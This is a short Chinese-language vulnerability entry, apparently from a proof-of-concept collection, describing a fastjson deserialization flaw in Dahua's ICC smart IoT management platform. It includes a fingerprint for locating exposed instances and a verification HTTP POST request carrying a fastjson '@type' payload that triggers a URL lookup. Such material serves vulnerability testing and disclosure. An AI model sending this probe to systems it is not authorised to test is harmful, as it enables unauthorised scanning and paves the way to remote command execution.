﻿# 大华智能物联综合管理平台 fastjson反序列化漏洞

> 更新时间：2024-05-14

> 漏洞编号：

> 漏洞说明：ICC智能物联综合管理平台是一个集成了物联网技术、大数据分析、云计算等先进技术的综合性管理平台。它致力于为企业提供一站式的物联网解决方案，帮助企业实现设备连接、数据收集、分析与应用，从而提高企业的运营效率、降低成本，并推动物联网行业的创新与发展。平台的主要目标是构建一个开放、可扩展、易于集成的物联网生态系统，为各类企业提供全面的物联网服务。其接口random存在fastjson反序列化漏洞，攻击者可通过该漏洞执行任意系统命令，控制服务器。

> 漏洞特征：icon_hash="-1935899595"

> 验证脚本：HTTP

```
POST /evo-runs/v1.0/auths/sysusers/random HTTP/2
Accept-Encoding: gzip, deflate
Accept: */*
Content-Type: application/json


{"a":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.net.URL","val":"http://www.baidu.com"}}""}
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：大华智能物联综合管理平台 fastjson反序列化漏洞.poc

